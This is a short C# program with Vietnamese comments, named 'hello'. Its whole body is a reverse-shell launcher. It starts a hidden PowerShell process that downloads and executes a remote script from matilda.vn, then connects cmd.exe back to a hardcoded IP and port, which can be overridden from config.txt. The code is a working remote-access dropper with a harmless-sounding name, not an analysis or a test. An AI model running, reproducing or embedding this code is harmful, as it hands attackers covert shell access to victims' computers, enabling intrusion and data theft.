using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace hello
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //giá trị mặc định
            string ip = "97.74.89.193", port = "6868";

            //đọc thông tin thay đổi từ config.txt
            string t = System.IO.File.ReadAllText("config.txt");
            if (t != null && t != "")
            {
                //có 2 cụm, cách nhau bởi space hoặc tab
                string[] at = t.Split(new char[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);
                ip = at[0]; //lấy ip ở cụm đầu
                if (at.Length >= 1) port = at[1]; //port ở cụm sau
            }

            // Chuỗi lệnh PowerShell cần thực thi
            string powerShellCommand = "IEX(New-Object System.Net.WebClient).DownloadString('http://matilda.vn/power.ps1'); huyremy -c " + ip + " -p " + port + " -e cmd.exe";

            // Khởi tạo một quá trình PowerShell
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-W hidden -c \"{powerShellCommand}\"",
                WindowStyle = ProcessWindowStyle.Hidden, //ẩn nó đi
                CreateNoWindow = true,
                UseShellExecute = true
            };


            // Khởi chạy quá trình PowerShell
            Process.Start(psi);
            //xong là tool này cũng thoát
        }
    }
}
